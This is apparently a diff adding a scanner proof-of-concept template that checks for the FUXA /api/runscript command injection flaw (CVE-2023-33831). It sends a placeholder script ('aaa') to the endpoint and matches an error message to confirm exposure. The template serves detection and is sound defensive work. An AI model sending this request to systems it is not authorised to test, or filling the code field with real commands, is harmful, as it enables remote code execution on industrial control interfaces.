@@ -1,0 +1,27 @@
+id: poc-yaml-fuxa-runscript-rce
+info:
+  name: Fuxa 命令注入漏洞(CVE-2023-33831)
+  severity: critical
+  tags:
+  - 两高一弱
+  - 命令注入
+  - CVE-2023-33831
+  finger: fuxa
+requests:
+- method: POST
+  path: /api/runscript
+  headers:
+    Content-Type: application/json
+  data: "{\n  \"headers\":\n      {\n          \"normalizedNames\":{},\n         \
+    \ \"lazyUpdate\": \"null\"\n      },\n      \"params\":{\n          \"script\"\
+    :{\n              \"parameters\":[\n              {\n              \"name\":\"\
+    aaaa\",\n              \"type\":\"tagid\",\n              \"value\":\"\"\n   \
+    \           }\n              ],\n              \"mode\":\"\",\n              \"\
+    id\":\"\",\n              \"test\":\"true\",\n              \"name\":\"ok\",\n\
+    \              \"outputId\":\"\",\n              \"code\":\"aaa\"\n          }\n\
+    \      }\n  }\n"
+  expression: "status_code == 400 \n&& contains(headers, \"ETag\") \n&& contains(body,\
+    \ \"\\\"error\\\":\\\"unexpected_error\\\"\") \n&& contains(body, \"TypeError:\
+    \ console.error is not a function\")\n"
+variables: {}
+transport: http
